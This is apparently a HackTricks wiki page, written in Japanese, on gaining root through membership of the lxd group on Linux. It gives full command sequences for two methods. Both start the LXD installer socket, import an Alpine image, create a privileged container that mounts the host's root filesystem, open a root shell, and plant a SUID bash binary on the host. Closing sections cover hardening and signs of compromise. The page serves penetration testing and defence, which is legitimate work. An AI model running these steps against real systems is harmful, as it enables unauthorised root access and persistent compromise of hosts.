# lxd/lxc Group - 権限昇格

{{#include ../../../banners/hacktricks-training.md}}

ホストの LXD 管理グループ（通常は _**lxd**_）に所属していると、デーモンを完全に制御できるため、root 権限を取得できる可能性があります。<sup>[[1]](#references)</sup> これは、[runtime control sockets](../../containers-namespaces/container-security/runtime-api-and-daemon-exposure.md) や [writable host mounts](../../containers-namespaces/container-security/sensitive-host-mounts.md) で説明されている信頼境界の問題と同じです。現在のプロセスがすでにコンテナ内にいなくても、管理 API へのアクセスだけで十分な場合があります。<sup>[[1]](#references)</sup>

## Ubuntu `lxd-installer` によるソケットアクティベーション

LXD snap が存在しないというだけで、`lxd` グループへの所属が無害だと決めつけないでください。Ubuntu Server 24.04 以降では、あらかじめインストールされる `lxd-installer` パッケージにより、`/run/lxd-installer.socket` が `root:lxd`、モード `0660` で公開されます。このソケットへの接続によって `lxd-installer@.service` が root として起動し、sudo パスワードも polkit 認可も不要で LXD snap がインストールされます。また、一部のラッパーのバージョンでは、標準入力が TTY でない場合に確認プロンプトが省略されます。<sup>[[10]](#references)[[11]](#references)</sup>

アカウントのグループ所属と、ソケットアクティベーションされるサービスの両方を確認してください。<sup>[[10]](#references)[[11]](#references)</sup>

```bash
id -nG
getent group lxd
stat -c '%A %U:%G %n' /run/lxd-installer.socket
systemctl cat lxd-installer.socket lxd-installer@.service
```

`lxd` グループへのアクセスが許可されたテストでは、通常の `lxc` ラッパーを介して、またはソケットに直接接続してインストーラーを起動できます。後者から、実際の認可境界はラッパーのプロンプトではなく、UnixソケットのACLであることがわかります:<sup>[[10]](#references)[[11]](#references)</sup>

```bash
python3 -c 'import socket; s=socket.socket(socket.AF_UNIX); s.connect("/run/lxd-installer.socket"); s.send(b"x"); s.recv(1)'
lxc version
```

Once the daemon is available, continue with the privileged-container techniques below.<sup>[[10]](#references)[[11]](#references)</sup>

## インターネットなしでの悪用

### 方法 1

信頼できるリポジトリから、LXD で使用する Alpine イメージをダウンロードできます。
Canonical の LXD イメージサーバーでは、日次ビルドが公開されています: [https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/](https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/)
最新のビルド（ディレクトリ名は日付）から **lxd.tar.xz** と **rootfs.squashfs** の両方を取得してください。<sup>[[8]](#references)</sup>

または、[プロジェクトの手順](https://github.com/lxc/distrobuilder)に従って、手元のマシンに distrobuilder をインストールできます。<sup>[[4]](#references)[[5]](#references)[[6]](#references)</sup>

```bash
# Install requirements
sudo apt update
sudo apt install -y golang-go gcc debootstrap rsync gpg squashfs-tools git make build-essential libwin-hivex-perl wimtools genisoimage    

# Clone repo
mkdir -p $HOME/go/src/github.com/lxc/
cd $HOME/go/src/github.com/lxc/
git clone https://github.com/lxc/distrobuilder

# Make distrobuilder
cd ./distrobuilder
make

# Prepare the creation of alpine
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml

# Create the container - Beware of architecture while compiling locally.
sudo $HOME/go/bin/distrobuilder build-incus alpine.yaml -o image.release=3.18 -o image.architecture=x86_64
```

**incus.tar.xz**（Canonical のイメージサーバーからダウンロードした場合は **lxd.tar.xz**）と **rootfs.squashfs** をアップロードし、イメージをインポートしてコンテナを作成します。<sup>[[2]](#references)[[3]](#references)[[5]](#references)[[8]](#references)[[9]](#references)</sup>

```bash
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine

# Check the image is there
lxc image list

# Create the container
lxc init alpine privesc -c security.privileged=true

# List containers
lxc list

lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```

> [!CAUTION]
> 次のエラーが表示された場合 _**Error: No storage pool found. Please create a new storage pool**_\
> **`lxd init`** を実行してデフォルトの storage pool を設定し、その後、前のコマンド群を**再実行**してください。<sup>[[2]](#references)</sup>

最後に、コンテナを起動し、ホストのファイルシステム上で root shell を開きます。<sup>[[1]](#references)[[2]](#references)</sup>

```bash
lxc start privesc
lxc exec privesc /bin/sh
[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
```

このprivileged instanceではUID 0が再マッピングされていないため、マウントされたホストのrootを介して、ホスト所有のSUID payloadを作成できます。これにより、operatorをコンテナshellに残すのではなく、コンテナからホストへのpivotが完了します：<sup>[[10]](#references)[[11]](#references)</sup>

```bash
# From the host, write the payload through the privileged container
lxc exec privesc -- /bin/sh -c 'cp /mnt/root/bin/bash /mnt/root/rootbash && chmod 4755 /mnt/root/rootbash'

# Execute on the host; -p prevents bash from dropping the SUID-derived EUID
/rootbash -p
id
```

SUIDを尊重するファイルシステム上にpayloadを配置します。別の`/tmp`は一般に`nosuid`でマウントされ、ホストの`/`を非再帰的にbind mountした場合、その配下に含まれないことがあります。そのため、この検証ではホストのroot filesystem上の`/rootbash`のようなパスのほうが確実です。<sup>[[10]](#references)[[11]](#references)</sup>

### Method 2

Alpine imageをビルドし、`security.privileged=true`フラグを指定して起動します。これにより、コンテナのrootがホストのrootにマッピングされます。次に`/`をmountすると、コンテナ内からホストのファイルシステムにアクセスできます。<sup>[[1]](#references)[[7]](#references)[[9]](#references)</sup>

```bash
# build a simple alpine image
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine
sudo ./build-alpine -a i686

# import the image
lxc image import ./alpine*.tar.gz --alias myimage # It's important doing this from YOUR HOME directory on the victim machine, or it might fail.

# before running the image, start and configure the lxd storage pool as default
lxd init

# run the image
lxc init myimage mycontainer -c security.privileged=true

# mount the /root into the image
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
```

## ホスト全体に影響する AppArmor の副作用

LXD snap を起動すると、`/run/sysctl.d/zz-lxd.conf` が書き込まれ、`kernel.apparmor_restrict_unprivileged_userns` と `kernel.apparmor_restrict_unprivileged_unconfined` の両方が `0` に設定される場合もあります。これにより、すべてのローカルユーザーに対する Ubuntu の非特権ユーザー名前空間の制限が弱まるため、ホストを評価する際は、LXD の有効化前後の値を記録してください。<sup>[[10]](#references)[[11]](#references)</sup>

```bash
cat /run/sysctl.d/zz-lxd.conf 2>/dev/null
sysctl kernel.apparmor_restrict_unprivileged_userns \
       kernel.apparmor_restrict_unprivileged_unconfined
```

## Audit and hardening

`lxd` グループへの所属は root 権限の付与として扱ってください。不要なメンバーを削除すると、新しいログインセッションから変更が反映されます。`lxd-installer` を完全削除するか、そのソケットをマスクしても、オンデマンドのインストール経路がなくなるだけで、インストール済みの LXD デーモンにすでにアクセスできるユーザーの権限は制限されません。<sup>[[10]](#references)[[11]](#references)</sup>

```bash
getent group lxd
sudo gpasswd -d <user> lxd

# Only if on-demand LXD installation is not required
sudo systemctl mask --now lxd-installer.socket
# or: sudo apt purge lxd-installer
```

侵害を示す有用な兆候には、`security.privileged=true` の LXD インスタンス、`source` が `/` のディスクデバイス、`/run/lxd-installer.socket` への予期しない接続、新たな SUID ファイル、上述の AppArmor sysctl の値が `1` から `0` に変化することが含まれます。<sup>[[10]](#references)[[11]](#references)</sup>

```bash
lxc list
lxc config show <instance> --expanded
find / -xdev -type f -perm -4000 2>/dev/null
```

## References

- [1] [LXDのセキュリティを強化する方法](https://canonical.com/lxd/docs/latest/howto/security_harden/)
- [2] [LXDコンテナと仮想マシン](https://ubuntu.com/server/docs/how-to/virtualisation/lxd/)
- [3] [イメージをコピーしてインポートする方法](https://canonical.com/lxd/docs/latest/howto/images_copy/)
- [4] [distrobuilder](https://github.com/lxc/distrobuilder)
- [5] [distrobuilderでイメージをビルドする方法](https://github.com/lxc/distrobuilder/blob/main/doc/howto/build.md)
- [6] [Alpineイメージ定義](https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml)
- [7] [lxd-alpine-builderのビルドスクリプト](https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine)
- [8] [LXDイメージサーバー](https://images.lxd.canonical.com/)
- [9] [タイプ: disk](https://canonical.com/lxd/docs/latest/reference/devices_disk/)
- [10] [STAR LabsによるLXDグループの権限昇格レポートとPoC](https://github.com/star-sg/lxd-group-privesc-report)
- [11] [古いワインを新しいボトルに：10年来のLXDグループによるroot権限取得が再び武装](https://starlabs.sg/blog/2026/06-old-wine-in-a-new-bottle-a-decade-old-lxd-group-root-re-armed)
{{#include ../../../banners/hacktricks-training.md}}
